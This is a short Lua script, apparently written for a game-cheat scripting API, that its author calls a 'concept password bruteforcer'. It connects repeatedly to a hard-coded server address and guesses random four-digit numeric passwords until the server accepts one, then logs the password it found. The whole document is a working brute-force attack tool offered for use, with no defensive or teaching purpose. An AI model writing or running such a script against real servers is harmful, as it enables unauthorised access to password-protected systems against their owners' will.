--concept password bruteforcer

local foundpassword = false --if we already found the password, why try looking for it again??
local password = nil --so we can log the password
local ip = "169.254.43.212:7376" --ip, ill add menu later
callbacks.Register("Draw", function()
if clientstate.GetClientSignonState() == 0 then
if foundpassword == true then
    client.Command("connect "..ip..";password "..password,true)
else
password = math.random(1,9999) --we generate the password, ik its not good since it only uses number but this is a concept
print("trying "..password)
  client.Command("connect "..ip..";password "..password,true)
end
elseif clientstate.GetClientSignonState() == 2 then
   print(password.." is the correct password for "..ip)
   foundpassword = true --if the password is successful, save it
end
end)